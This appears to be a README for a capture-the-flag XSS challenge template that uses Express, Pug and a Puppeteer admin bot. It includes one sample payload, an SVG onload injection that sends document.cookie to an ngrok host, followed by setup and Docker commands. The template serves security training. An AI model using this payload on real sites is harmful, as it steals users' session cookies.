XSS Template
==============

This project is supposed to be a template for XSS challenges if you host CTFs.

Uses express, pug templating system and puppeteer for the admin bot.


Valid payload
--------------

`http://localhost:4000/?xss=%3Csvg%20onload=%22fetch(%27http://dd77eda6.ngrok.io/?%27%2bdocument.cookie)%22%20/%3E`


Running locally
================

`FLAG=FireShell{test} npm start`


How to setup
============

Flag is sent at src/bot.js, it's defined by the environment variable FLAG.


Building the docker image
==========================

`docker build -t xss .`


Running the docker image
=========================

`docker run --cap-add=SYS_ADMIN -e FLAG=FireShell{test} -p 4000:4000 xss`
